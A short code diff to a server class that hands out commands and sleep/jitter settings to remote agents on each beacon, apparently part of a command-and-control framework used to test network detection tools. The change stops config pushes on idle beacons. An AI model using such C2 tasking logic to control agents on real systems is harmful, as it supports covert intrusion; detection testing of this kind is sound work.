@@ -1527,10 +1527,12 @@ class RMMServer:
                 session.config_pending = False
                 config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
                 return (config_cmd, "config")
-            if not session.config_synced:
-                return ("", "none")
-            config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
-            return (config_cmd, "config")
+            # Idle: no commands and no pending config update.
+            # Do NOT push __CONFIG__ here — the agent keeps its own sleep/jitter defaults
+            # until the operator explicitly changes them via PATCH (sets config_pending=True).
+            # Pushing config on every empty beacon caused the agent to inherit a persisted
+            # 60-second sleep_seconds, breaking 5-second C2 beacon detection in NDR tools.
+            return ("", "none")
 
     @staticmethod
     def _unwrap_rmm_result_text(body: str) -> tuple:
